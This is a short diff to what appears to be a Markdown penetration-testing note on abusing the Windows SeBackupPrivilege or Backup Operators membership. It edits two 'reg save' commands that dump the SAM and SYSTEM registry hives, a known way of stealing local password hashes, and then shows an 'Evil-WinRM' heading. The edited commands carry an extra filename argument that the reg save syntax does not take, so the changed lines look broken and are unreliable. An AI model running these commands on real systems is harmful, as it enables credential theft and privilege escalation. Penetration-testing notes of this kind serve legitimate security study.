@@ -3,11 +3,11 @@ If an user has the SeBackupPrivilege enabled or is part of the Backup Operators 
 ## Registry Hive PoC
 
 ```
-reg save hklm\sam C:\Temp\SAM
+reg save hklm\sam C:\Temp\SAM sam.bak
 ```
 
 ```
-reg save hklm\system C:\Temp\SYSTEM
+reg save hklm\system C:\Temp\SYSTEM system.bak
 ```
 ##### Evil-WinRM
 
